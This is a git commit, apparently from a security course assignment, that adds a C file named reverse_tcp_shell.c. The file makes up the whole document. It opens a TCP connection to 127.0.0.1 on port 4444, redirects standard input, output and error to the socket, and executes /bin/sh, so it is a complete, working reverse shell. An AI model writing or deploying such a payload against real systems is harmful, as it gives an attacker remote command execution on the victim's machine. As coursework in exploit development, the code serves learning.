1be4bc4cb867a4aeea73b5c057df3a97a5cd48f0
strikergoutham <strikergoutham@gmail.com>
2018-11-30 21:15:04 +0530

    Create reverse_tcp_shell.c

---
+++ Assignment2/reverse_tcp_shell.c
@@ -0,0 +1,32 @@
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+
+int main()
+{
+	//create a socket
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	
+	struct sockaddr_in client_addr;
+  client_addr.sin_family = AF_INET;
+	
+	//set port
+	client_addr.sin_port = htons(4444);
+
+	//set IP address to connect
+	client_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	
+	
+	//connects using the created sock to the properties set at client_addr
+	connect(sock, (struct sockaddr *)&client_addr, sizeof(client_addr));
+		
+	//redirect std input,output and error to created socket
+	dup2(sock,0);
+	dup2(sock,1);
+	dup2(sock,2);
+
+	// spawn a shell
+	execve("/bin/sh", NULL, NULL);
+
+}
